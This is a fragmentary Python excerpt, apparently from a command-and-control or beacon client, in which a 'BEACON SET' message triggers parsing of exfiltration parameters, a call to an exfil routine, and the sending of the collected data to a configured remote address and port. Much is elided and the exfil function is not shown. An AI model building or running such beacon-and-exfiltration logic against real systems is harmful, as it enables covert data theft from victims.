    ...
    try:
        ...
        if(js['message'] == 'BEACON SET'):
            ...
            if('start' in test):
                ...
                cs.canLoop(test, running_commands[-1])
            ...
            print("IM IN HERE")
            exfil_params = js['data']
            print(exfil_params)
            exfil_list = exfil_params.strip('][').split(', ')
            print(exfil_list,type(exfil_list))
            ...
            time.sleep(1)
            ss.send_encrypted_message(request_data, config['remote_address'], config['remote_comm_port'])
            interface = exfil_list[0]
            arb = exfil_list[1]
            mask = exfil_list[2]
            timeout = exfil_list[3]
            exfil_data = cs.exfil(interface,arb,mask,timeout)
            time.sleep(1)
            ss.send_normal_message(exfil_data,config['remote_address'], config['remote_comm_port'])
